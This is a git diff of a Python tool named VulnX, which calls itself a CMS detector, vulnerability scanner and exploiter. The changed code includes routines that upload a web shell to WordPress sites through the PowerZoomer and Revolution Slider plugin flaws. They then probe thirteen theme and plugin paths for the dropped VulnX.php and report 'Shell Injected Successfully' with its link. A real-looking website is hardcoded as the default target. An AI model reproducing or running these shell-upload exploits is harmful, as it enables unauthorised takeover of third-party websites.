@@ -2,11 +2,10 @@
 
 # Title : VulnX
 # Author: BENSAAD Anouar
-
+# Desc  : CMS-Detector and Vulnerability Scanner & exploiter
 import sys
 import argparse
 import urllib
-
 import re
 import requests
 import os
@@ -22,7 +21,6 @@ G = '\033[92m' # green
 now = datetime.datetime.now()
 year = now.strftime('%Y')
 month= now.strftime('%m')
-
 headers = {
             "Connection": "keep-alive",
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31",
@@ -31,6 +29,9 @@ headers = {
 #url = "http://www.AmnPardaz.com/"
 #url = "http://www.curtiswrightoutfitters.com"
 url = "https://www.maplatine.com"
+
+################ BANNER #####################
+
 def banner():
     print("""%s
                    __     __     _      __  __
@@ -47,7 +48,6 @@ def parser_error(errmsg):
     print(R + "Error: " + errmsg + W)
     sys.exit()
 
-
 def parse_args():
     # parse the arguments
     parser = argparse.ArgumentParser(epilog='\tExample: \r\npython ' + sys.argv[0] + " -u google.com")
@@ -58,12 +58,10 @@ def parse_args():
     parser.add_argument('-o', '--output', help='Save the results to text file')
     return parser.parse_args()
 
-################ KNOWS #####################
+################ DETECT CMS #####################
 
-def contentw():
+def detect_cms():
     id = 0
-
-
     r=requests.get(url, headers)
     content = r.text
     joomla = re.findall("com_content | Joomla!", content)
@@ -328,14 +326,14 @@ def wp_powerzoomer():
         }
     send_shell = requests.post(endpoint,options,headers)
     response  = send_shell.text
-    check_powerzoomer = re.findall("\/uploads\/powerzoomer\/(.*?)\/big\/XAttacker.php", response)
+    check_powerzoomer = re.findall("\/uploads\/powerzoomer\/(.*?)\/big\/VulnX.php", response)
     if check_powerzoomer:
         uploadfolder = check_powerzoomer.group(1)
         dump_data = url + "/wp-content/uploads/powerzoomer/"+uploadfolder+"/big/VulnX.php?Vuln=X"
-        print ('%s [%s+%s] Injection Content%s ----------- %s YES' %(W,G,W,W,G))
+        print ('%s [%s+%s] Powerzoomer Content%s ------- %s YES' %(W,G,W,W,G))
         print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B,dump_data ))
     else:
-        print ('%s [%s-%s] Injection Content%s --------- %s NO' %(W,R,W,W,R))
+        print ('%s [%s-%s] Powerzoomer Content%s ------- %s NO' %(W,R,W,W,R))
 
 def wp_revslider():
     endpoint = url + "/wp-admin/admin-ajax.php"
@@ -350,21 +348,19 @@ def wp_revslider():
         'update_file':[open('./shell/VulnX.zip','rb')]
     }
     send_shell = requests.post(endpoint,options,headers)
-
-    revslidera=requests.get(url+"/wp-content/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
-    revsliderb=requests.get(url+"/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
-    revsliderc=requests.get(url+"/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
-    revsliderd=requests.get(url+"/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
-    revslidere=requests.get(url+"/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
-    revsliderf=requests.get(url+"/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/VulnX.php", headers)
-    revsliderg=requests.get(url+"/wp-content/themes/centum/revslider/temp/update_extract/revslider/VulnX.php", headers)
-    revsliderh=requests.get(url+"/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
-    revslideri=requests.get(url+"/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
-    revsliderj=requests.get(url+"/wp-content/themes/pindol/revslider/temp/update_extract/revslider/VulnX.php", headers)
-    revsliderk=requests.get(url+"/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
-    revsliderl=requests.get(url+"/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
-    revsliderm=requests.get(url+"/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
-
+    revslidera=requests.get(url+"/wp-content/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
+    revsliderb=requests.get(url+"/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
+    revsliderc=requests.get(url+"/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
+    revsliderd=requests.get(url+"/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
+    revslidere=requests.get(url+"/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
+    revsliderf=requests.get(url+"/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/VulnX.php", headers).text
+    revsliderg=requests.get(url+"/wp-content/themes/centum/revslider/temp/update_extract/revslider/VulnX.php", headers).text
+    revsliderh=requests.get(url+"/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
+    revslideri=requests.get(url+"/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
+    revsliderj=requests.get(url+"/wp-content/themes/pindol/revslider/temp/update_extract/revslider/VulnX.php", headers).text
+    revsliderk=requests.get(url+"/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
+    revsliderl=requests.get(url+"/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
+    revsliderm=requests.get(url+"/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
     check_revslidera = re.findall("Vuln X", revslidera)
     check_revsliderb = re.findall("Vuln X", revsliderb)
     check_revsliderc = re.findall("Vuln X", revsliderc)
@@ -378,76 +374,48 @@ def wp_revslider():
     check_revsliderk = re.findall("Vuln X", revsliderk)
     check_revsliderl = re.findall("Vuln X", revsliderl)
     check_revsliderm = re.findall("Vuln X", revsliderm)
-
     if check_revslidera:
-        print ('%s [%s+%s] Revslider Plugin%s --------- %s YES' %(W,G,W,W,G))
+        print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
         print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
-    else:
-        print ('%s [%s-%s] Revslider Plugin%s --------- %s NO' %(W,R,W,W,R))
-    if check_revsliderb:
-        print ('%s [%s+%s] Revslider Plugin%s --------- %s YES' %(W,G,W,W,G))
+    elif check_revsliderb:
+        print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
         print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
-    else:
-        print ('%s [%s-%s] Revslider Plugin%s --------- %s NO' %(W,R,W,W,R))
-    if check_revsliderc:
-        print ('%s [%s+%s] Revslider Plugin%s --------- %s YES' %(W,G,W,W,G))
+    elif check_revsliderc:
+        print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
         print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
-    else:
-        print ('%s [%s-%s] Revslider Plugin%s --------- %s NO' %(W,R,W,W,R))
-    if check_revsliderd:
-        print ('%s [%s+%s] Revslider Plugin%s --------- %s YES' %(W,G,W,W,G))
+    elif check_revsliderd:
+        print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
         print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
-    else:
-        print ('%s [%s-%s] Revslider Plugin%s --------- %s NO' %(W,R,W,W,R))
-    if check_revslidere:
-        print ('%s [%s+%s] Revslider Plugin%s --------- %s YES' %(W,G,W,W,G))
+    elif check_revslidere:
+        print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
         print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
-    else:
-        print ('%s [%s-%s] Revslider Plugin%s --------- %s NO' %(W,R,W,W,R))
-    if check_revsliderf:
-        print ('%s [%s+%s] Revslider Plugin%s --------- %s YES' %(W,G,W,W,G))
+    elif check_revsliderf:
+        print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
         print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
-    else:
-        print ('%s [%s-%s] Revslider Plugin%s --------- %s NO' %(W,R,W,W,R))
-    if check_revsliderg:
-        print ('%s [%s+%s] Revslider Plugin%s --------- %s YES' %(W,G,W,W,G))
+    elif check_revsliderg:
+        print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
         print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/centum/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
-    else:
-        print ('%s [%s-%s] Revslider Plugin%s --------- %s NO' %(W,R,W,W,R))
-    if check_revsliderh:
-        print ('%s [%s+%s] Revslider Plugin%s --------- %s YES' %(W,G,W,W,G))
+    elif check_revsliderh:
+        print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
         print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
-    else:
-        print ('%s [%s-%s] Revslider Plugin%s --------- %s NO' %(W,R,W,W,R))
-    if check_revslideri:
-        print ('%s [%s+%s] Revslider Plugin%s --------- %s YES' %(W,G,W,W,G))
+    elif check_revslideri:
+        print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
         print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
-    else:
-        print ('%s [%s-%s] Revslider Plugin%s --------- %s NO' %(W,R,W,W,R))
-    if check_revsliderj:
-        print ('%s [%s+%s] Revslider Plugin%s --------- %s YES' %(W,G,W,W,G))
+    elif check_revsliderj:
+        print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
         print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/pindol/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
-    else:
-        print ('%s [%s-%s] Revslider Plugin%s --------- %s NO' %(W,R,W,W,R))
-    if check_revsliderk:
-        print ('%s [%s+%s] Revslider Plugin%s --------- %s YES' %(W,G,W,W,G))
+    elif check_revsliderk:
+        print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
         print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
-    else:
-        print ('%s [%s-%s] Revslider Plugin%s --------- %s NO' %(W,R,W,W,R))
-    if check_revsliderl:
-        print ('%s [%s+%s] Revslider Plugin%s --------- %s YES' %(W,G,W,W,G))
+    elif check_revsliderl:
+        print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
         print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
-    else:
-        print ('%s [%s-%s] Revslider Plugin%s --------- %s NO' %(W,R,W,W,R))
-    if check_revsliderm:
-        print ('%s [%s+%s] Revslider Plugin%s --------- %s YES' %(W,G,W,W,G))
+    elif check_revsliderm:
+        print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
         print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
     else:
-        print ('%s [%s-%s] Revslider Plugin%s --------- %s NO' %(W,R,W,W,R))
-
-
+        print ('%s [%s-%s] Revslider Plugin%s ---------- %s NO' %(W,R,W,W,R))
 if __name__ == "__main__":
-
     #site = args.file
     banner()
-    contentw()
+    detect_cms()
